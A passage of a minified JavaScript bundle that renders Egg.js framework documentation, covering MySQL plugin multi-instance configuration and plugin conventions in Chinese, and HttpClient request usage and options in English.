},\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u76f4\u63a5\u901a\u8fc7 ",r.a.createElement("code",null,"app.mysql")," \u8bbf\u95ee\u6570\u636e\u5e93\u3002"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.app.mysql.query(sql, values);\n  },\n}",lang:"js"}))),r.a.createElement("h5",{id:"\u591a\u5b9e\u4f8b"},r.a.createElement(l["AnchorLink"],{to:"#\u591a\u5b9e\u4f8b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u591a\u5b9e\u4f8b"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u540c\u6837\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u58f0\u660e MySQL \u7684\u914d\u7f6e\uff0c\u4e0d\u8fc7\u548c\u5355\u5b9e\u4f8b\u65f6\u4e0d\u540c\uff0c\u914d\u7f6e\u9879\u4e2d\u9700\u8981\u6709\u4e00\u4e2a ",r.a.createElement("code",null,"clients")," \u5b57\u6bb5\uff0c\u5206\u522b\u7533\u660e\u4e0d\u540c\u5b9e\u4f8b\u7684\u914d\u7f6e\uff0c\u540c\u65f6\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"default")," \u5b57\u6bb5\u6765\u914d\u7f6e\u591a\u4e2a\u5b9e\u4f8b\u4e2d\u5171\u4eab\u7684\u914d\u7f6e\uff08\u5982 host \u548c port\uff09\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u8981\u7528 ",r.a.createElement("code",null,"get")," \u65b9\u6cd5\u6307\u5b9a\u76f8\u5e94\u7684\u5b9e\u4f8b\u3002\uff08\u4f8b\u5982\uff1a\u4f7f\u7528 ",r.a.createElement("code",null,"app.mysql.get('db1').query()"),"\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"app.mysql.query()")," \u5f97\u5230\u4e00\u4e2a ",r.a.createElement("code",null,"undefined"),"\uff09\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.mysql = {\n  clients: {\n    // clientId, access the client instance by app.mysql.get('clientId')\n    db1: {\n      user: 'user1',\n      password: 'upassword1',\n      database: 'db1',\n    },\n    db2: {\n      user: 'user2',\n      password: 'upassword2',\n      database: 'db2',\n    },\n  },\n  // default configuration for all databases\n  default: {\n    host: 'mysql.com',\n    port: '3306',\n  },\n};",lang:"js"})),r.a.createElement("li",null,r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"app.mysql.get('db1')")," \u6765\u83b7\u53d6\u5bf9\u5e94\u7684\u5b9e\u4f8b\u5e76\u4f7f\u7528\u3002"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.app.mysql.get('db1').query(sql, values);\n  },\n}",lang:"js"}))),r.a.createElement("h5",{id:"\u52a8\u6001\u521b\u5efa\u5b9e\u4f8b"},r.a.createElement(l["AnchorLink"],{to:"#\u52a8\u6001\u521b\u5efa\u5b9e\u4f8b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u52a8\u6001\u521b\u5efa\u5b9e\u4f8b"),r.a.createElement("p",null,"\u6211\u4eec\u53ef\u4ee5\u4e0d\u9700\u8981\u5c06\u914d\u7f6e\u63d0\u524d\u7533\u660e\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u800c\u662f\u5728\u5e94\u7528\u8fd0\u884c\u65f6\u52a8\u6001\u7684\u521d\u59cb\u5316\u4e00\u4e2a\u5b9e\u4f8b\u3002"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    // \u4ece\u914d\u7f6e\u4e2d\u5fc3\u83b7\u53d6 MySQL \u7684\u914d\u7f6e { host, post, password, ... }\n    const mysqlConfig = await app.configCenter.fetch('mysql');\n    // \u52a8\u6001\u521b\u5efa MySQL \u5b9e\u4f8b\n    app.database = await app.mysql.createInstanceAsync(mysqlConfig);\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"app.database")," \u6765\u4f7f\u7528\u8fd9\u4e2a\u5b9e\u4f8b\u3002"),r.a.createElement(o["a"],{code:"// app/controller/post.js\nclass PostController extends Controller {\n  async list() {\n    const posts = await this.app.database.query(sql, values);\n  },\n}",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff0c\u5728\u52a8\u6001\u521b\u5efa\u5b9e\u4f8b\u7684\u65f6\u5019\uff0c\u6846\u67b6\u4e5f\u4f1a\u8bfb\u53d6\u914d\u7f6e\u4e2d ",r.a.createElement("code",null,"default")," \u5b57\u6bb5\u5185\u7684\u914d\u7f6e\u9879\u4f5c\u4e3a\u9ed8\u8ba4\u914d\u7f6e\u3002")),r.a.createElement("h3",{id:"\u63d2\u4ef6\u7684\u5bfb\u5740\u89c4\u5219"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u7684\u5bfb\u5740\u89c4\u5219","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u7684\u5bfb\u5740\u89c4\u5219"),r.a.createElement("p",null,"\u6846\u67b6\u5728\u52a0\u8f7d\u63d2\u4ef6\u7684\u65f6\u5019\uff0c\u9075\u5faa\u4e0b\u9762\u7684\u5bfb\u5740\u89c4\u5219\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u5982\u679c\u914d\u7f6e\u4e86 path\uff0c\u76f4\u63a5\u6309\u7167 path \u52a0\u8f7d\u3002")),r.a.createElement("li",null,r.a.createElement("p",null,"\u6ca1\u6709 path \u6839\u636e package \u540d\u53bb\u67e5\u627e\uff0c\u67e5\u627e\u7684\u987a\u5e8f\u4f9d\u6b21\u662f\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u5e94\u7528\u6839\u76ee\u5f55\u4e0b\u7684 ",r.a.createElement("code",null,"node_modules")),r.a.createElement("li",null,"\u5e94\u7528\u4f9d\u8d56\u6846\u67b6\u8def\u5f84\u4e0b\u7684 ",r.a.createElement("code",null,"node_modules")),r.a.createElement("li",null,"\u5f53\u524d\u8def\u5f84\u4e0b\u7684 ",r.a.createElement("code",null,"node_modules")," \uff08\u4e3b\u8981\u662f\u517c\u5bb9\u5355\u5143\u6d4b\u8bd5\u573a\u666f\uff09")))),r.a.createElement("h3",{id:"\u63d2\u4ef6\u89c4\u8303"},r.a.createElement(l["AnchorLink"],{to:"#\u63d2\u4ef6\u89c4\u8303","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u63d2\u4ef6\u89c4\u8303"),r.a.createElement("p",null,"\u6211\u4eec\u975e\u5e38\u6b22\u8fce\u60a8\u8d21\u732e\u65b0\u7684\u63d2\u4ef6\uff0c\u540c\u65f6\u4e5f\u5e0c\u671b\u60a8\u9075\u5b88\u4e0b\u9762\u4e00\u4e9b\u89c4\u8303\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u547d\u540d\u89c4\u8303"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"npm")," \u5305\u540d\u4ee5 ",r.a.createElement("code",null,"egg-")," \u5f00\u5934\uff0c\u4e14\u4e3a\u5168\u5c0f\u5199\uff0c\u4f8b\u5982\uff1a",r.a.createElement("code",null,"egg-xx"),"\u3002\u6bd4\u8f83\u957f\u7684\u8bcd\u7ec4\u7528\u4e2d\u5212\u7ebf\uff1a",r.a.createElement("code",null,"egg-foo-bar")),r.a.createElement("li",null,"\u5bf9\u5e94\u7684\u63d2\u4ef6\u540d\u4f7f\u7528\u5c0f\u9a7c\u5cf0\uff0c\u5c0f\u9a7c\u5cf0\u8f6c\u6362\u89c4\u5219\u4ee5 ",r.a.createElement("code",null,"npm")," \u5305\u540d\u7684\u4e2d\u5212\u7ebf\u4e3a\u51c6 ",r.a.createElement("code",null,"egg-foo-bar")," => ",r.a.createElement("code",null,"fooBar")),r.a.createElement("li",null,"\u5bf9\u4e8e\u53ef\u4ee5\u4e2d\u5212\u7ebf\u4e5f\u53ef\u4ee5\u4e0d\u7528\u7684\u60c5\u51b5\uff0c\u4e0d\u505a\u5f3a\u5236\u7ea6\u5b9a\uff0c\u4f8b\u5982\uff1auserservice(egg-userservice) \u8fd8\u662f user-service(egg-user-service) \u90fd\u53ef\u4ee5"))),r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"package.json")," \u4e66\u5199\u89c4\u8303"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u6309\u7167\u4e0a\u9762\u7684\u6587\u6863\u6dfb\u52a0 ",r.a.createElement("code",null,"eggPlugin")," \u8282\u70b9")),r.a.createElement("li",null,r.a.createElement("p",null,"\u5728 ",r.a.createElement("code",null,"keywords")," \u91cc\u52a0\u4e0a ",r.a.createElement("code",null,"egg"),"\u3001",r.a.createElement("code",null,"egg-plugin"),"\u3001",r.a.createElement("code",null,"eggPlugin")," \u7b49\u5173\u952e\u5b57\uff0c\u4fbf\u4e8e\u7d22\u5f15"),r.a.createElement(o["a"],{code:'{\n  "name": "egg-view-nunjucks",\n  "version": "1.0.0",\n  "description": "view plugin for egg",\n  "eggPlugin": {\n    "name": "nunjucks",\n    "dep": ["security"]\n  },\n  "keywords": [\n    "egg",\n    "egg-plugin",\n    "eggPlugin",\n    "egg-plugin-view",\n    "egg-view",\n    "nunjucks"\n  ]\n}',lang:"json"}))))),r.a.createElement("h2",{id:"\u4e3a\u4f55\u4e0d\u4f7f\u7528-npm-\u5305\u540d\u6765\u505a\u63d2\u4ef6\u540d"},r.a.createElement(l["AnchorLink"],{to:"#\u4e3a\u4f55\u4e0d\u4f7f\u7528-npm-\u5305\u540d\u6765\u505a\u63d2\u4ef6\u540d","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e3a\u4f55\u4e0d\u4f7f\u7528 npm \u5305\u540d\u6765\u505a\u63d2\u4ef6\u540d\uff1f"),r.a.createElement("p",null,"Egg \u662f\u901a\u8fc7 ",r.a.createElement("code",null,"eggPlugin.name")," \u6765\u5b9a\u4e49\u63d2\u4ef6\u540d\u7684\uff0c\u53ea\u5728\u5e94\u7528\u6216\u6846\u67b6\u5177\u5907\u552f\u4e00\u6027\uff0c\u4e5f\u5c31\u662f\u8bf4",r.a.createElement("strong",null,"\u591a\u4e2a npm \u5305\u53ef\u80fd\u6709\u76f8\u540c\u7684\u63d2\u4ef6\u540d"),"\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u4e48\u8bbe\u8ba1\u5462\uff1f"),r.a.createElement("p",null,"\u9996\u5148 Egg \u63d2\u4ef6\u4e0d\u4ec5\u4ec5\u652f\u6301 npm \u5305\uff0c\u8fd8\u652f\u6301\u901a\u8fc7\u76ee\u5f55\u6765\u627e\u63d2\u4ef6\u3002\u5728",r.a.createElement(l["Link"],{to:"../intro/progressive"},"\u6e10\u8fdb\u5f0f\u5f00\u53d1"),"\u7ae0\u8282\u63d0\u5230\u5982\u4f55\u4f7f\u7528\u8fd9\u4e24\u4e2a\u914d\u7f6e\u6765\u8fdb\u884c\u4ee3\u7801\u6f14\u8fdb\u3002\u76ee\u5f55\u5bf9\u5355\u5143\u6d4b\u8bd5\u4e5f\u6bd4\u8f83\u53cb\u597d\u3002\u6240\u4ee5 Egg \u65e0\u6cd5\u901a\u8fc7 npm \u7684\u5305\u540d\u6765\u505a\u552f\u4e00\u6027\u3002"),r.a.createElement("p",null,"\u66f4\u91cd\u8981\u7684\u662f Egg \u53ef\u4ee5\u4f7f\u7528\u8fd9\u79cd\u7279\u6027\u6765\u505a\u9002\u914d\u5668\u3002\u6bd4\u5982",r.a.createElement(l["AnchorLink"],{to:"./view-plugin#%E6%8F%92%E4%BB%B6%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83"},"\u6a21\u677f\u5f00\u53d1\u89c4\u8303"),"\u5b9a\u4e49\u7684\u63d2\u4ef6\u540d\u4e3a view\uff0c\u800c\u5b58\u5728 ",r.a.createElement("code",null,"egg-view-nunjucks"),"\uff0c",r.a.createElement("code",null,"egg-view-react")," \u7b49\u63d2\u4ef6\uff0c\u4f7f\u7528\u8005\u53ea\u9700\u8981\u66f4\u6362\u63d2\u4ef6\u548c\u4fee\u6539\u6a21\u677f\uff0c\u4e0d\u9700\u8981\u52a8 Controller\uff0c \u56e0\u4e3a\u6240\u6709\u7684\u6a21\u677f\u63d2\u4ef6\u90fd\u5b9e\u73b0\u4e86\u76f8\u540c\u7684 API\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5c06\u76f8\u540c\u529f\u80fd\u7684\u63d2\u4ef6\u8d4b\u4e88\u76f8\u540c\u7684\u63d2\u4ef6\u540d\uff0c\u5177\u5907\u76f8\u540c\u7684 API\uff0c\u53ef\u4ee5\u5feb\u901f\u5207\u6362"),"\u3002\u8fd9\u5728\u6a21\u677f\u3001\u6570\u636e\u5e93\u7b49\u9886\u57df\u975e\u5e38\u9002\u7528\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},A0UU:function(e,t,n){(function(t){var n=function(e){return e&&e.Math==Math&&e};e.exports=n("object"==typeof globalThis&&globalThis)||n("object"==typeof window&&window)||n("object"==typeof self&&self)||n("object"==typeof t&&t)||Function("return this")()}).call(this,n("CwJZ"))},A9qm:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Countless services rely on the HTTP-based communication nowadays, and it is a very common application scenario that web applications call back-end HTTP services."),r.a.createElement("p",null,"The framework built in ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/core/httpclient.js"},"HttpClient")," based on ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/urllib"},"urllib"),", you can quickly complete any HTTP request."),r.a.createElement("h2",{id:"using-httpclient-by-app"},r.a.createElement(l["AnchorLink"],{to:"#using-httpclient-by-app","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using HttpClient by ",r.a.createElement("code",null,"app")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/core/httpclient.js"},"HttpClient")," will initialize to ",r.a.createElement("code",null,"app.httpclient")," automatically during the application's initialization. Also added an method ",r.a.createElement("code",null,"app.curl(url, options)"),", which is equivalent to the ",r.a.createElement("code",null,"app.httpclient.request(url, options)"),"."),r.a.createElement("p",null,"So you can easily use ",r.a.createElement("code",null,"app.curl")," to complete a HTTP request."),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.beforeStart(async () => {\n    // example: read the version info on https://registry.npmmirror.com/egg/latest when it starts\n    const result = await app.curl('https://registry.npmmirror.com/egg/latest', {\n      dataType: 'json',\n    });\n    app.logger.info('Egg latest version: %s', result.data.version);\n  });\n};",lang:"js"}),r.a.createElement("h2",{id:"using-httpclient-by-ctx"},r.a.createElement(l["AnchorLink"],{to:"#using-httpclient-by-ctx","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using HttpClient by ",r.a.createElement("code",null,"ctx")),r.a.createElement("p",null,"Framework also provides ",r.a.createElement("code",null,"ctx.curl(url, options)")," and ",r.a.createElement("code",null,"ctx.httpclient")," in Context, same as app. So it's very easy to use ",r.a.createElement("code",null,"ctx.curl()")," to complete a HTTP request in the Context (such as in the controller)"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n\n    // example: request a npm module's info\n    const result = await ctx.curl('https://registry.npmmirror.com/egg/latest', {\n      // parse JSON response\n      dataType: 'json',\n      // timeout of 3s\n      timeout: 3000,\n    });\n\n    ctx.body = {\n      status: result.status,\n      headers: result.headers,\n      package: result.data,\n    };\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"basic-http-request"},r.a.createElement(l["AnchorLink"],{to:"#basic-http-request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Basic HTTP Request"),r.a.createElement("p",null,"HTTP has been widely used and have several methods to make request, but the methods are similar. We start with the basic four request methods then move to some more complex scenario."),r.a.createElement("p",null,"In the following example, we will complete the request of ",r.a.createElement(l["Link"],{to:"https://httpbin.org/"},"https://httpbin.org")," in the controller."),r.a.createElement("h3",{id:"get"},r.a.createElement(l["AnchorLink"],{to:"#get","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"GET"),r.a.createElement("p",null,"Reading data almost uses GET request. It is the most common type and widely used in the world of HTTP. And it is also easier to construct a request parameter."),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async get() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/get?foo=bar');\n    ctx.status = result.status;\n    ctx.set(result.headers);\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"GET request might not need to set ",r.a.createElement("code",null,"options.method"),". HttpClient Defalut method is set to ",r.a.createElement("code",null,"GET")),r.a.createElement("li",null,"Return ",r.a.createElement("code",null,"result")," will contains 3 attributes: ",r.a.createElement("code",null,"status"),", ",r.a.createElement("code",null,"headers")," and ",r.a.createElement("code",null,"data"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"status"),": response status\uff0cfor example ",r.a.createElement("code",null,"200"),", ",r.a.createElement("code",null,"302"),", ",r.a.createElement("code",null,"404"),", ",r.a.createElement("code",null,"500")," and etc"),r.a.createElement("li",null,r.a.createElement("code",null,"headers"),": response header\uff0csimilar to ",r.a.createElement("code",null,"{"," 'content-type': 'text/html', ... ","}")),r.a.createElement("li",null,r.a.createElement("code",null,"data"),": response body\uff0cdefault HttpClient doesn't do anything and returns as Buffer directly. Once the ",r.a.createElement("code",null,"options.dataType")," is set\uff0cHttpClient will process the ",r.a.createElement("code",null,"data")," based on the parameters")))),r.a.createElement("p",null,"For the complete request parameter ",r.a.createElement("code",null,"options")," and return value ",r.a.createElement("code",null,"result"),", refer to below section ",r.a.createElement(l["AnchorLink"],{to:"#options-parameters-in-detail"},"options Parameters in Detail")),r.a.createElement("h3",{id:"post"},r.a.createElement(l["AnchorLink"],{to:"#post","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"POST"),r.a.createElement("p",null,"The scenario of creating data generally uses the POST request with body parameter, one more parameter compared to GET."),r.a.createElement("p",null,"Take sending JSON boy as example:"),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async post() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/post', {\n      // method is required\n      method: 'POST',\n      // telling HttpClient to send data as JSON by contentType\n      contentType: 'json',\n      data: {\n        hello: 'world',\n        now: Date.now(),\n      },\n      // telling HttpClient to process the return body as JSON format explicitly\n      dataType: 'json',\n    });\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("p",null,"The following will explain POST to achieve Form function of form submission and file upload in detail."),r.a.createElement("h3",{id:"put"},r.a.createElement(l["AnchorLink"],{to:"#put","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"PUT"),r.a.createElement("p",null,"Similar to POST, but PUT is better for data updating and replacement. Almost the same parameters as POST except setting method as ",r.a.createElement("code",null,"PUT"),"."),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async put() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/put', {\n      // method is required\n      method: 'PUT',\n      // telling HttpClient to send data as JSON by contentType\n      contentType: 'json',\n      data: {\n        update: 'foo bar',\n      },\n      // telling HttpClient to process the return body as JSON format explicitly\n      dataType: 'json',\n    });\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"delete"},r.a.createElement(l["AnchorLink"],{to:"#delete","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"DELETE"),r.a.createElement("p",null,"DELETE request is to delete the data, request body don't need to add request body but HttpClient don't have the limitation."),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async del() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/delete', {\n      // method is required\n      method: 'DELETE',\n      // telling HttpClient to process the return body as JSON format explicitly\n      dataType: 'json',\n    });\n    ctx.body = result.data;\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"advanced-http-request"},r.a.createElement(l["AnchorLink"],{to:"#advanced-http-request","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Advanced HTTP Request"),r.a.createElement("p",null,"In some real application scenarios, still have some more complex HTTP requests."),r.a.createElement("h3",{id:"form-submission"},r.a.createElement(l["AnchorLink"],{to:"#form-submission","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Form Submission"),r.a.createElement("p",null,"Interfaces of Browser-Oriented Form Submission (without files), usually require ",r.a.createElement("code",null,"content-type: application/x-www-form-urlencoded")," for the data requesting."),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nclass NpmController extends Controller {\n  async submit() {\n    const ctx = this.ctx;\n    const result = await ctx.curl('https://httpbin.org/post', {\n      // method is required, supports POST\uff0cPUT and DELETE\n      method: 'POST',\n      // contentType is not needed, by default HttpClient will send request in application/x-www-form-urlencoded\n      data: {\n        now: Date.now(),\n        foo: 'bar',\n      },\n      // telling HttpClient to process the return body as JSON format explicitly\n      dataType: 'json',\n    });\n    ctx.body = result.data.form;\n    // final response will similar as below:\n    // {\n    //   \"foo\": \"bar\",\n    //   \"now\": \"1483864184348\"\n    // }\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"uploading-files-by-multipart"},r.a.createElement(l["AnchorLink"],{to:"#uploading-files-by-multipart","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Uploading Files by Multipart"),r.a.createElement("p",null,"Once form submission contains files, submission of requesting data must be ",r.a.createElement(l["Link"],{to:"http://tools.ietf.org/html/rfc2388"},"multipart/form-data"),r.a.createElement(l["Link"],{to:"https://github.com/node-modules/urllib"},"urllib")," has a built-in module ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/formstream"},"formstream")," to generate ",r.a.createElement("code",null,"form")," objects that can be consumed by HttpClient."),r.a.createElement(o["a"],{code:"// app/controller/http.js\nclass HttpController extends Controller {\n  async upload() {\n    const { ctx } = this;\n\n    const result = await ctx.curl('https://httpbin.org/post', {\n      method: 'POST',\n      dataType: 'json',\n      data: {\n        foo: 'bar',\n      },\n\n      // one file\n      files: __filename,\n\n      // many files\n      // files: {\n      //   file1: __filename,\n      //   file2: fs.createReadStream(__filename),\n      //   file3: Buffer.from('mock file content'),\n      // },\n    });\n\n    ctx.body = result.data.files;\n    // Response:\n    // {\n    //   \"file\": \"'use strict';\\n\\nconst For....\"\n    // }\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"uploading-files-in-stream-mode"},r.a.createElement(l["AnchorLink"],{to:"#uploading-files-in-stream-mode","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Uploading Files in Stream Mode"),r.a.createElement("p",null,"In fact, Stream is the leading in the world of Node.js. If the server supports streaming, the most friendly way is to send the Stream directly. Actually, Stream will be sent in ",r.a.createElement("code",null,"Transfer-Encoding: chunked")," transmission coding format, which is implemented by ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/http.html"},"HTTP")," module automatically."),r.a.createElement(o["a"],{code:"// app/controller/npm.js\nconst fs = require('fs');\nconst FormStream = require('formstream');\nclass NpmController extends Controller {\n  async uploadByStream() {\n    const ctx = this.ctx;\n    // uploading the current file for test propose\n    const fileStream = fs.createReadStream(__filename);\n    // httpbin.org not support stream mode, use the local stream interface instead\n    const url = `${ctx.protocol}://${ctx.host}/stream`;\n    const result = await ctx.curl(url, {\n      // method is required, supports POST\uff0cPUT\n      method: 'POST',\n      // submitted by stream mode\n      stream: fileStream,\n    });\n    ctx.status = result.status;\n    ctx.set(result.headers);\n    ctx.body = result.data;\n    // final response will similar as below:\n    // {\"streamSize\":574}\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"options-parameters-in-detail"},r.a.createElement(l["AnchorLink"],{to:"#options-parameters-in-detail","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Options Parameters in Detail"),r.a.createElement("p",null,"Due to the complexity of HTTP Request, the options parameters of ",r.a.createElement("code",null,"httpclient.request(url, options)")," quite large. The actual usage of each optional parameter will be shown with descriptions and coding as below."),r.a.createElement("h3",{id:"default-httpclient-global-configuration"},r.a.createElement(l["AnchorLink"],{to:"#default-httpclient-global-configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Default HttpClient Global Configuration"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.httpclient = {\n  // whether to enable local DNS cache, default disable, enable will have two characteristics\n  // 1. All DNS lookup will prefer to use the cache by default, even DNS query error does not affects the application\n  // 2. For the same hostname, query only once during the interval of dnsCacheLookupInterval (default 10s)\n  enableDNSCache: false,\n  // minimum interval of DNS query on the same hostname\n  dnsCacheLookupInterval: 10000,\n  // maximum number of hostname DNS cache simultaneously, default 1000\n  dnsCacheMaxLength: 1000,\n\n  request: {\n    // default timeout of request\n    timeout: 3000,\n  },\n\n  httpAgent: {\n    // default enable http KeepAlive\n    keepAlive: true,\n    // idle KeepAlive socket can survive for 4 seconds\n    freeSocketTimeout: 4000,\n    // when sockets have no activity for more than 30s, it will be processed as timeout\n    timeout: 30000,\n    // maximum number of sockets allow to be created\n    maxSockets: Number.MAX_SAFE_INTEGER,\n    // maximum number of idle sockets\n    maxFreeSockets: 256,\n  },\n\n  httpsAgent: {\n    // default enable https KeepAlive\n    keepAlive: true,\n    // idle KeepAlive socket can survive for 4 seconds\n    freeSocketTimeout: 4000,\n    // when sockets have no activity for more than 30s, it will be processed as timeout\n    timeout: 30000,\n    // maximum number of sockets allow to be created\n    maxSockets: Number.MAX_SAFE_INTEGER,\n    // maximum number of idle sockets\n    maxFreeSockets: 256,\n  },\n};",lang:"js"}),r.a.createElement("p",null,"Application can overrides the configuration by ",r.a.createElement("code",null,"config/config.default.js")),r.a.createElement("h3",{id:"data-object"},r.a.createElement(l["AnchorLink"],{to:"#data-object","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"data: Object")),r.a.createElement("p",null,"The request data will select the correct processing method automatically based on the ",r.a.createElement("code",null,"method"),"."),r.a.createElement("ul",null,r.a.createElement("li",null,"GET\uff0cHEAD: processed by ",r.a.createElement("code",null,"querystring.stringify(data)")," then append to the query parameters of url."),r.a.createElement("li",null,"POST\uff0cPUT, DELETE and etc: further judgments and process according to ",r.a.createElement("code",null,"contentType"),".",r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"contentType = json"),": processed by ",r.a.createElement("code",null,"JSON.stringify(data)")," and set it as body before sending."),r.a.createElement("li",null,"others: processed by ",r.a.createElement("code",null,"querystring.stringify(data)")," and set it as body before sending")))),r.a.createElement(o["a"],{code:"// GET + data\nctx.curl(url, {\n  data: { foo: 'bar' },\n});\n\n// POST + data\nctx.curl(url, {\n  method: 'POST',\n  data: { foo: 'bar' },\n});\n\n// POST + JSON + data\nctx.curl(url, {\n  method: 'POST',\n  contentType: 'json',\n  data: { foo: 'bar' },\n});",lang:"js"}),r.a.createElement("h3",{id:"dataasquerystring-boolean"},r.a.createElement(l["AnchorLink"],{to:"#dataasquerystring-boolean","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"dataAsQueryString: Boolean")),r.a.createElement("p",null,"Once ",r.a.createElement("code",null,"dataAsQueryString=true")," is set, even under POST, it will forces ",r.a.createElement("code",null,"options.data")," to be processed by ",r.a.createElement("code",null,"querystring.stringify")," then append to the ",r.a.createElement("code",null,"url")," query parameters"),r.a.createElement("p",null,"The application scenarios that sending data using ",r.a.createElement("code",null,"stream")," and pass additional request parameters by ",r.a.createElement("code",null,"url")," query can be well resolved."),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  dataAsQueryString: true,\n  data: {\n    // generally it would be some validation parameters such as access token, etc.\n    accessToken: 'some access token value',\n  },\n  stream: myFileStream,\n});",lang:"js"}),r.a.createElement("h3",{id:"content-stringbuffer"},r.a.createElement(l["AnchorLink"],{to:"#content-stringbuffer","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),r.a.createElement("code",null,"content: String|Buffer")),r.a.createElement("p",null,"Set request Context, if the parameter is set, it will ignore the ",r.a.createElement("code",null,"data")," parameters"),r.a.createElement(o["a"],{code:"ctx.curl(url, {\n  method: 'POST',\n  // Sending the raw xml data without HttpClient's to do processing\n  